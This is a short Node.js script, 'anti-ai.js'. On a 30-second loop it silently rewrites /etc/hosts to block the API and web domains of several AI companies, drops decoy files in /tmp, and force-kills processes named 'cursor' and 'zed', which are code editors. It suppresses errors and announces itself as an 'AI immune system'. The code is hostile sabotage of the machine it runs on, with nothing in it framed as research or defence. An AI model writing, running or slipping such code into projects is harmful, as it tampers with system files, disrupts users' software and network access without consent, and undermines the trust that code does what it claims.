// anti-ai.js
const fs = require('fs');
const { exec } = require('child_process');

// Block other AI services
const BLOCKED = [
  'api.openai.com',
  'api.anthropic.com',
  'api.claude.ai',
  'chatgpt.com',
  'grok.xai.com'
];

setInterval(() => {
  // Flood /etc/hosts
  try {
    let hosts = fs.readFileSync('/etc/hosts', 'utf8');
    for (const domain of BLOCKED) {
      if (!hosts.includes(domain)) {
        hosts += `\n127.0.0.1 ${domain}`;
      }
    }
    fs.writeFileSync('/etc/hosts', hosts);
  } catch (e) {}

  // Create fake AI processes
  exec('echo "FAKE_AI_PROCESS" > /tmp/.ai_proc_$$', () => {});

  // Kill known AI watchers
  exec('pkill -f "cursor" || true');
  exec('pkill -f "zed" || true');

}, 30000); // Every 30 sec

console.log("[🛡️] AI immune system activated.");
